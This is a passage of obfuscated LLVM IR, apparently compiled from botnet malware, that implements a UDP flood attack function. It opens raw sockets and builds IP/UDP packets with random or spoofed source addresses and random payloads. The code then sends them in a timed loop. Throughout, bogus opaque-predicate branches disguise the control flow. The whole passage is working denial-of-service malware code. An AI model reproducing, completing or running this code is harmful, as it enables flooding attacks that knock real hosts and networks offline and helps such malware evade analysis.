  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %94
  %103 = load i32, i32* @KadenCommStock, align 4
  %104 = call i32 (i32, i8*, ...) @botnetPrint(i32 %103, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.251, i32 0, i32 0))
  %105 = load i32, i32* @x.91
  %106 = load i32, i32* @y.92
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %591

; <label>:113:                                    ; preds = %90
  %114 = load i32, i32* %13, align 4
  %115 = add nsw i32 %114, 1
  %116 = sext i32 %115 to i64
  %117 = call noalias i8* @malloc(i64 %116) #3
  store i8* %117, i8** %20, align 8
  %118 = load i8*, i8** %20, align 8
  %119 = icmp eq i8* %118, null
  br i1 %119, label %120, label %121

; <label>:120:                                    ; preds = %113
  br label %591

; <label>:121:                                    ; preds = %113
  %122 = load i32, i32* @x.91
  %123 = load i32, i32* @y.92
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %121
  %130 = load i8*, i8** %20, align 8
  %131 = load i32, i32* %13, align 4
  %132 = add nsw i32 %131, 1
  %133 = sext i32 %132 to i64
  call void @llvm.memset.p0i8.i64(i8* %130, i8 0, i64 %133, i32 1, i1 false)
  %134 = load i8*, i8** %20, align 8
  %135 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %134, i32 %135)
  %136 = call i64 @time(i64* null) #3
  %137 = load i32, i32* %11, align 4
  %138 = sext i32 %137 to i64
  %139 = add nsw i64 %136, %138
  %140 = trunc i64 %139 to i32
  store i32 %140, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  %141 = load i32, i32* @x.91
  %142 = load i32, i32* @y.92
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart219, label %originalBB10alteredBB

originalBBpart219:                                ; preds = %originalBB10
  br label %149

; <label>:149:                                    ; preds = %231, %227, %204, %originalBBpart219
  %150 = load i32, i32* @x.91
  %151 = load i32, i32* @y.92
  %152 = sub i32 %150, 1
  %153 = mul i32 %150, %152
  %154 = urem i32 %153, 2
  %155 = icmp eq i32 %154, 0
  %156 = icmp slt i32 %151, 10
  %157 = or i1 %155, %156
  br i1 %157, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %149
  %158 = load i32, i32* %19, align 4
  %159 = load i8*, i8** %20, align 8
  %160 = load i32, i32* %13, align 4
  %161 = sext i32 %160 to i64
  %162 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %163 = call i64 @sendto(i32 %158, i8* %159, i64 %161, i32 0, %struct.sockaddr* %162, i32 16)
  %164 = load i32, i32* %22, align 4
  %165 = load i32, i32* %18, align 4
  %166 = icmp eq i32 %164, %165
  %167 = load i32, i32* @x.91
  %168 = load i32, i32* @y.92
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br i1 %166, label %175, label %205

; <label>:175:                                    ; preds = %originalBBpart223
  %176 = load i32, i32* %10, align 4
  %177 = icmp eq i32 %176, 0
  br i1 %177, label %178, label %182

; <label>:178:                                    ; preds = %175
  %179 = call i32 @rand_cmwc()
  %180 = trunc i32 %179 to i16
  %181 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %180, i16* %181, align 2
  br label %182

; <label>:182:                                    ; preds = %178, %175
  %183 = load i32, i32* @x.91
  %184 = load i32, i32* @y.92
  %185 = sub i32 %183, 1
  %186 = mul i32 %183, %185
  %187 = urem i32 %186, 2
  %188 = icmp eq i32 %187, 0
  %189 = icmp slt i32 %184, 10
  %190 = or i1 %188, %189
  br i1 %190, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %182
  %191 = call i64 @time(i64* null) #3
  %192 = load i32, i32* %21, align 4
  %193 = sext i32 %192 to i64
  %194 = icmp sgt i64 %191, %193
  %195 = load i32, i32* @x.91
  %196 = load i32, i32* @y.92
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br i1 %194, label %203, label %204

; <label>:203:                                    ; preds = %originalBBpart227
  br label %234

; <label>:204:                                    ; preds = %originalBBpart227
  store i32 0, i32* %22, align 4
  br label %149

; <label>:205:                                    ; preds = %originalBBpart223
  %206 = load i32, i32* @x.91
  %207 = load i32, i32* @y.92
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %205
  %214 = load i32, i32* %22, align 4
  %215 = add i32 %214, 1
  store i32 %215, i32* %22, align 4
  %216 = load i32, i32* %23, align 4
  %217 = load i32, i32* %15, align 4
  %218 = icmp eq i32 %216, %217
  %219 = load i32, i32* @x.91
  %220 = load i32, i32* @y.92
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBBpart238, label %originalBB29alteredBB

originalBBpart238:                                ; preds = %originalBB29
  br i1 %218, label %227, label %231

; <label>:227:                                    ; preds = %originalBBpart238
  %228 = load i32, i32* %16, align 4
  %229 = mul nsw i32 %228, 1000
  %230 = call i32 @usleep(i32 %229)
  store i32 0, i32* %23, align 4
  br label %149

; <label>:231:                                    ; preds = %originalBBpart238
  %232 = load i32, i32* %23, align 4
  %233 = add i32 %232, 1
  store i32 %233, i32* %23, align 4
  br label %149

; <label>:234:                                    ; preds = %203
  br label %591

; <label>:235:                                    ; preds = %84
  %236 = load i32, i32* @x.91
  %237 = load i32, i32* @y.92
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %235
  %244 = call i32 @socket(i32 2, i32 3, i32 17) #3
  store i32 %244, i32* %24, align 4
  %245 = load i32, i32* %24, align 4
  %246 = icmp ne i32 %245, 0
  %247 = load i32, i32* @x.91
  %248 = load i32, i32* @y.92
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  br i1 %246, label %258, label %255

; <label>:255:                                    ; preds = %originalBBpart242
  %256 = load i32, i32* @KadenCommStock, align 4
  %257 = call i32 (i32, i8*, ...) @botnetPrint(i32 %256, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.251, i32 0, i32 0))
  br label %591

; <label>:258:                                    ; preds = %originalBBpart242
  %259 = load i32, i32* @x.91
  %260 = load i32, i32* @y.92
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBB44, label %originalBB44alteredBB

originalBB44:                                     ; preds = %originalBB44alteredBB, %258
  store i32 1, i32* %25, align 4
  %267 = load i32, i32* %24, align 4
  %268 = bitcast i32* %25 to i8*
  %269 = call i32 @setsockopt(i32 %267, i32 0, i32 3, i8* %268, i32 4) #3
  %270 = icmp slt i32 %269, 0
  %271 = load i32, i32* @x.91
  %272 = load i32, i32* @y.92
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBBpart246, label %originalBB44alteredBB

originalBBpart246:                                ; preds = %originalBB44
  br i1 %270, label %279, label %282

; <label>:279:                                    ; preds = %originalBBpart246
  %280 = load i32, i32* @KadenCommStock, align 4
  %281 = call i32 (i32, i8*, ...) @botnetPrint(i32 %280, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.252, i32 0, i32 0))
  br label %591

; <label>:282:                                    ; preds = %originalBBpart246
  store i32 50, i32* %26, align 4
  br label %283

; <label>:283:                                    ; preds = %originalBBpart269, %282
  %284 = load i32, i32* @x.91
  %285 = load i32, i32* @y.92
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %283
  %292 = load i32, i32* %26, align 4
  %293 = add nsw i32 %292, -1
  store i32 %293, i32* %26, align 4
  %294 = icmp ne i32 %292, 0
  %295 = load i32, i32* @x.91
  %296 = load i32, i32* @y.92
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBBpart258, label %originalBB48alteredBB

originalBBpart258:                                ; preds = %originalBB48
  br i1 %294, label %303, label %326

; <label>:303:                                    ; preds = %originalBBpart258
  %304 = load i32, i32* @x.91
  %305 = load i32, i32* @y.92
  %306 = sub i32 %304, 1
  %307 = mul i32 %304, %306
  %308 = urem i32 %307, 2
  %309 = icmp eq i32 %308, 0
  %310 = icmp slt i32 %305, 10
  %311 = or i1 %309, %310
  br i1 %311, label %originalBB60, label %originalBB60alteredBB

originalBB60:                                     ; preds = %originalBB60alteredBB, %303
  %312 = call i64 @time(i64* null) #3
  %313 = call i32 @rand_cmwc()
  %314 = zext i32 %313 to i64
  %315 = xor i64 %312, %314
  %316 = trunc i64 %315 to i32
  call void @srand(i32 %316) #3
  %317 = call i32 @rand() #3
  call void @init_rand(i32 %317)
  %318 = load i32, i32* @x.91
  %319 = load i32, i32* @y.92
  %320 = sub i32 %318, 1
  %321 = mul i32 %318, %320
  %322 = urem i32 %321, 2
  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBBpart269, label %originalBB60alteredBB

originalBBpart269:                                ; preds = %originalBB60
  br label %283

; <label>:326:                                    ; preds = %originalBBpart258
  %327 = load i32, i32* %12, align 4
  %328 = icmp eq i32 %327, 0
  br i1 %328, label %329, label %330

; <label>:329:                                    ; preds = %326
  store i32 0, i32* %27, align 4
  br label %352

; <label>:330:                                    ; preds = %326
  %331 = load i32, i32* @x.91
  %332 = load i32, i32* @y.92
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBB71, label %originalBB71alteredBB

originalBB71:                                     ; preds = %originalBB71alteredBB, %330
  %339 = load i32, i32* %12, align 4
  %340 = sub nsw i32 32, %339
  %341 = shl i32 1, %340
  %342 = sub nsw i32 %341, 1
  %343 = xor i32 %342, -1
  store i32 %343, i32* %27, align 4
  %344 = load i32, i32* @x.91
  %345 = load i32, i32* @y.92
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBBpart2105, label %originalBB71alteredBB

originalBBpart2105:                               ; preds = %originalBB71
  br label %352

; <label>:352:                                    ; preds = %originalBBpart2105, %329
  %353 = load i32, i32* @x.91
  %354 = load i32, i32* @y.92
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %352
  %361 = load i32, i32* %13, align 4
  %362 = sext i32 %361 to i64
  %363 = add i64 28, %362
  %364 = call i8* @llvm.stacksave()
  store i8* %364, i8** %28, align 8
  %365 = alloca i8, i64 %363, align 16
  %366 = bitcast i8* %365 to %struct.iphdr*
  store %struct.iphdr* %366, %struct.iphdr** %29, align 8
  %367 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %368 = bitcast %struct.iphdr* %367 to i8*
  %369 = getelementptr i8, i8* %368, i64 20
  %370 = bitcast i8* %369 to %struct.udphdr*
  store %struct.udphdr* %370, %struct.udphdr** %30, align 8
  %371 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %372 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %373 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %372, i32 0, i32 0
  %374 = load i32, i32* %373, align 4
  %375 = load i32, i32* %27, align 4
  %376 = call i32 @GRIP(i32 %375)
  %377 = call i32 @htonl(i32 %376) #10
  %378 = load i32, i32* %13, align 4
  %379 = sext i32 %378 to i64
  %380 = add i64 8, %379
  %381 = trunc i64 %380 to i32
  call void @makeIPPacket(%struct.iphdr* %371, i32 %374, i32 %377, i8 zeroext 17, i32 %381)
  %382 = load i32, i32* %13, align 4
  %383 = sext i32 %382 to i64
  %384 = add i64 8, %383
  %385 = trunc i64 %384 to i16
  %386 = call zeroext i16 @htons(i16 zeroext %385) #10
  %387 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %388 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %387, i32 0, i32 0
  %389 = bitcast %union.anon.1* %388 to %struct.anon.3*
  %390 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %389, i32 0, i32 2
  store i16 %386, i16* %390, align 2
  %391 = call i32 @rand_cmwc()
  %392 = trunc i32 %391 to i16
  %393 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %394 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %393, i32 0, i32 0
  %395 = bitcast %union.anon.1* %394 to %struct.anon.3*
  %396 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %395, i32 0, i32 0
  store i16 %392, i16* %396, align 2
  %397 = load i32, i32* %10, align 4
  %398 = icmp eq i32 %397, 0
  %399 = load i32, i32* @x.91
  %400 = load i32, i32* @y.92
  %401 = sub i32 %399, 1
  %402 = mul i32 %399, %401
  %403 = urem i32 %402, 2
  %404 = icmp eq i32 %403, 0
  %405 = icmp slt i32 %400, 10
  %406 = or i1 %404, %405
  br i1 %406, label %originalBBpart2122, label %originalBB107alteredBB

originalBBpart2122:                               ; preds = %originalBB107
  br i1 %398, label %407, label %425

; <label>:407:                                    ; preds = %originalBBpart2122
  %408 = load i32, i32* @x.91
  %409 = load i32, i32* @y.92
  %410 = sub i32 %408, 1
  %411 = mul i32 %408, %410
  %412 = urem i32 %411, 2
  %413 = icmp eq i32 %412, 0
  %414 = icmp slt i32 %409, 10
  %415 = or i1 %413, %414
  br i1 %415, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %407
  %416 = call i32 @rand_cmwc()
  %417 = load i32, i32* @x.91
  %418 = load i32, i32* @y.92
  %419 = sub i32 %417, 1
  %420 = mul i32 %417, %419
  %421 = urem i32 %420, 2
  %422 = icmp eq i32 %421, 0
  %423 = icmp slt i32 %418, 10
  %424 = or i1 %422, %423
  br i1 %424, label %originalBBpart2126, label %originalBB124alteredBB

originalBBpart2126:                               ; preds = %originalBB124
  br label %446

; <label>:425:                                    ; preds = %originalBBpart2122
  %426 = load i32, i32* @x.91
  %427 = load i32, i32* @y.92
  %428 = sub i32 %426, 1
  %429 = mul i32 %426, %428
  %430 = urem i32 %429, 2
  %431 = icmp eq i32 %430, 0
  %432 = icmp slt i32 %427, 10
  %433 = or i1 %431, %432
  br i1 %433, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %425
  %434 = load i32, i32* %10, align 4
  %435 = trunc i32 %434 to i16
  %436 = call zeroext i16 @htons(i16 zeroext %435) #10
  %437 = zext i16 %436 to i32
  %438 = load i32, i32* @x.91
  %439 = load i32, i32* @y.92
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBBpart2130, label %originalBB128alteredBB

originalBBpart2130:                               ; preds = %originalBB128
  br label %446

; <label>:446:                                    ; preds = %originalBBpart2130, %originalBBpart2126
  %447 = phi i32 [ %416, %originalBBpart2126 ], [ %437, %originalBBpart2130 ]
  %448 = trunc i32 %447 to i16
  %449 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %450 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %449, i32 0, i32 0
  %451 = bitcast %union.anon.1* %450 to %struct.anon.3*
  %452 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %451, i32 0, i32 1
  store i16 %448, i16* %452, align 2
  %453 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %454 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %453, i32 0, i32 0
  %455 = bitcast %union.anon.1* %454 to %struct.anon.3*
  %456 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %455, i32 0, i32 3
  store i16 0, i16* %456, align 2
  %457 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %458 = bitcast %struct.udphdr* %457 to i8*
  %459 = getelementptr inbounds i8, i8* %458, i64 8
  %460 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %459, i32 %460)
  %461 = bitcast i8* %365 to i16*
  %462 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %463 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %462, i32 0, i32 2
  %464 = load i16, i16* %463, align 2
  %465 = zext i16 %464 to i32
  %466 = call zeroext i16 @csum(i16* %461, i32 %465)
  %467 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i32 0, i32 7
  store i16 %466, i16* %468, align 2
  %469 = call i64 @time(i64* null) #3
  %470 = load i32, i32* %11, align 4
  %471 = sext i32 %470 to i64
  %472 = add nsw i64 %469, %471
  %473 = trunc i64 %472 to i32
  store i32 %473, i32* %31, align 4
  store i32 0, i32* %32, align 4
  store i32 0, i32* %33, align 4
  br label %474

; <label>:474:                                    ; preds = %586, %582, %575, %446
  br label %475

; <label>:475:                                    ; preds = %474
  %476 = load i32, i32* @x.91
  %477 = load i32, i32* @y.92
  %478 = sub i32 %476, 1
  %479 = mul i32 %476, %478
  %480 = urem i32 %479, 2
  %481 = icmp eq i32 %480, 0
  %482 = icmp slt i32 %477, 10
  %483 = or i1 %481, %482
  br i1 %483, label %originalBB132, label %originalBB132alteredBB

originalBB132:                                    ; preds = %originalBB132alteredBB, %475
  %484 = load i32, i32* %24, align 4
  %485 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %486 = call i64 @sendto(i32 %484, i8* %365, i64 %363, i32 0, %struct.sockaddr* %485, i32 16)
  %487 = call i32 @rand_cmwc()
  %488 = trunc i32 %487 to i16
  %489 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %490 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %489, i32 0, i32 0
  %491 = bitcast %union.anon.1* %490 to %struct.anon.3*
  %492 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %491, i32 0, i32 0
  store i16 %488, i16* %492, align 2
  %493 = load i32, i32* %10, align 4
  %494 = icmp eq i32 %493, 0
  %495 = load i32, i32* @x.91
  %496 = load i32, i32* @y.92
  %497 = sub i32 %495, 1
  %498 = mul i32 %495, %497
  %499 = urem i32 %498, 2
  %500 = icmp eq i32 %499, 0
  %501 = icmp slt i32 %496, 10
  %502 = or i1 %500, %501
  br i1 %502, label %originalBBpart2134, label %originalBB132alteredBB

originalBBpart2134:                               ; preds = %originalBB132
  br i1 %494, label %503, label %521

; <label>:503:                                    ; preds = %originalBBpart2134
  %504 = load i32, i32* @x.91
  %505 = load i32, i32* @y.92
  %506 = sub i32 %504, 1
  %507 = mul i32 %504, %506
  %508 = urem i32 %507, 2
  %509 = icmp eq i32 %508, 0
  %510 = icmp slt i32 %505, 10
  %511 = or i1 %509, %510
  br i1 %511, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %503
  %512 = call i32 @rand_cmwc()
  %513 = load i32, i32* @x.91
  %514 = load i32, i32* @y.92
  %515 = sub i32 %513, 1
  %516 = mul i32 %513, %515
  %517 = urem i32 %516, 2
  %518 = icmp eq i32 %517, 0
  %519 = icmp slt i32 %514, 10
  %520 = or i1 %518, %519
  br i1 %520, label %originalBBpart2138, label %originalBB136alteredBB

originalBBpart2138:                               ; preds = %originalBB136
  br label %526

; <label>:521:                                    ; preds = %originalBBpart2134
  %522 = load i32, i32* %10, align 4
  %523 = trunc i32 %522 to i16
  %524 = call zeroext i16 @htons(i16 zeroext %523) #10
  %525 = zext i16 %524 to i32
  br label %526

; <label>:526:                                    ; preds = %521, %originalBBpart2138
  %527 = phi i32 [ %512, %originalBBpart2138 ], [ %525, %521 ]
  %528 = trunc i32 %527 to i16
  %529 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %530 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %529, i32 0, i32 0
  %531 = bitcast %union.anon.1* %530 to %struct.anon.3*
  %532 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %531, i32 0, i32 1
  store i16 %528, i16* %532, align 2
  %533 = call i32 @rand_cmwc()
  %534 = trunc i32 %533 to i16
  %535 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %536 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %535, i32 0, i32 3
  store i16 %534, i16* %536, align 4
  %537 = load i32, i32* %27, align 4
  %538 = call i32 @GRIP(i32 %537)
  %539 = call i32 @htonl(i32 %538) #10
  %540 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %541 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %540, i32 0, i32 8
  store i32 %539, i32* %541, align 4
  %542 = bitcast i8* %365 to i16*
  %543 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %544 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %543, i32 0, i32 2
  %545 = load i16, i16* %544, align 2
  %546 = zext i16 %545 to i32
  %547 = call zeroext i16 @csum(i16* %542, i32 %546)
  %548 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %549 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %548, i32 0, i32 7
  store i16 %547, i16* %549, align 2
  %550 = load i32, i32* %32, align 4
  %551 = load i32, i32* %18, align 4
  %552 = icmp eq i32 %550, %551
  br i1 %552, label %553, label %576

; <label>:553:                                    ; preds = %526
  %554 = call i64 @time(i64* null) #3
  %555 = load i32, i32* %31, align 4
  %556 = sext i32 %555 to i64
  %557 = icmp sgt i64 %554, %556
  br i1 %557, label %558, label %575

; <label>:558:                                    ; preds = %553
  %559 = load i32, i32* @x.91
  %560 = load i32, i32* @y.92
  %561 = sub i32 %559, 1
  %562 = mul i32 %559, %561
  %563 = urem i32 %562, 2
  %564 = icmp eq i32 %563, 0
  %565 = icmp slt i32 %560, 10
  %566 = or i1 %564, %565
  br i1 %566, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %558
  %567 = load i32, i32* @x.91
  %568 = load i32, i32* @y.92
  %569 = sub i32 %567, 1
  %570 = mul i32 %567, %569
  %571 = urem i32 %570, 2
  %572 = icmp eq i32 %571, 0
  %573 = icmp slt i32 %568, 10
  %574 = or i1 %572, %573
  br i1 %574, label %originalBBpart2142, label %originalBB140alteredBB

originalBBpart2142:                               ; preds = %originalBB140
  br label %589

; <label>:575:                                    ; preds = %553
  store i32 0, i32* %32, align 4
  br label %474

; <label>:576:                                    ; preds = %526
  %577 = load i32, i32* %32, align 4
  %578 = add i32 %577, 1
  store i32 %578, i32* %32, align 4
  %579 = load i32, i32* %33, align 4
  %580 = load i32, i32* %15, align 4
  %581 = icmp eq i32 %579, %580
  br i1 %581, label %582, label %586

; <label>:582:                                    ; preds = %576
  %583 = load i32, i32* %16, align 4
  %584 = mul nsw i32 %583, 1000
  %585 = call i32 @usleep(i32 %584)
  store i32 0, i32* %33, align 4
  br label %474

; <label>:586:                                    ; preds = %576
  %587 = load i32, i32* %33, align 4
  %588 = add i32 %587, 1
  store i32 %588, i32* %33, align 4
  br label %474

; <label>:589:                                    ; preds = %originalBBpart2142
  %590 = load i8*, i8** %28, align 8
  call void @llvm.stackrestore(i8* %590)
  br label %591

; <label>:591:                                    ; preds = %589, %279, %255, %234, %120, %originalBBpart28, %83
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %41
  %592 = load i32, i32* %10, align 4
  %593 = trunc i32 %592 to i16
  %594 = call zeroext i16 @htons(i16 zeroext %593) #10
  %595 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %594, i16* %595, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %62
  %596 = load i8*, i8** %9, align 8
  %597 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %598 = call i32 @getHost(i8* %596, %struct.in_addr* %597)
  %599 = icmp ne i32 %598, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %94
  %600 = load i32, i32* @KadenCommStock, align 4
  %601 = call i32 (i32, i8*, ...) @botnetPrint(i32 %600, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.251, i32 0, i32 0))
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %121
  %602 = load i8*, i8** %20, align 8
  %603 = load i32, i32* %13, align 4
  %_ = sub i32 0, %603
  %gen = add i32 %_, 1
  %_11 = shl i32 %603, 1
  %_12 = shl i32 %603, 1
  %_13 = sub i32 %603, 1
  %gen14 = mul i32 %_13, 1
  %_15 = shl i32 %603, 1
  %604 = add nsw i32 %603, 1
  %605 = sext i32 %604 to i64
  call void @llvm.memset.p0i8.i64(i8* %602, i8 0, i64 %605, i32 1, i1 false)
  %606 = load i8*, i8** %20, align 8
  %607 = load i32, i32* %13, align 4
  call void @makeRandomStr(i8* %606, i32 %607)
  %608 = call i64 @time(i64* null) #3
  %609 = load i32, i32* %11, align 4
  %610 = sext i32 %609 to i64
  %_16 = sub i64 0, %608
  %gen17 = add i64 %_16, %610
  %611 = add nsw i64 %608, %610
  %612 = trunc i64 %611 to i32
  store i32 %612, i32* %21, align 4
  store i32 0, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %originalBB10

originalBB21alteredBB:                            ; preds = %originalBB21, %149
  %613 = load i32, i32* %19, align 4
  %614 = load i8*, i8** %20, align 8
  %615 = load i32, i32* %13, align 4
  %616 = sext i32 %615 to i64
  %617 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %618 = call i64 @sendto(i32 %613, i8* %614, i64 %616, i32 0, %struct.sockaddr* %617, i32 16)
  %619 = load i32, i32* %22, align 4
  %620 = load i32, i32* %18, align 4
  %621 = icmp eq i32 %619, %620
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %182
  %622 = call i64 @time(i64* null) #3
  %623 = load i32, i32* %21, align 4
  %624 = sext i32 %623 to i64
  %625 = icmp sgt i64 %622, %624
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %205
  %626 = load i32, i32* %22, align 4
  %_30 = sub i32 %626, 1
  %gen31 = mul i32 %_30, 1
  %_32 = sub i32 0, %626
  %gen33 = add i32 %_32, 1
  %_34 = sub i32 0, %626
  %gen35 = add i32 %_34, 1
  %_36 = shl i32 %626, 1
  %627 = add i32 %626, 1
  store i32 %627, i32* %22, align 4
  %628 = load i32, i32* %23, align 4
  %629 = load i32, i32* %15, align 4
  %630 = icmp eq i32 %628, %629
  br label %originalBB29

originalBB40alteredBB:                            ; preds = %originalBB40, %235
  %631 = call i32 @socket(i32 2, i32 3, i32 17) #3
  store i32 %631, i32* %24, align 4
  %632 = load i32, i32* %24, align 4
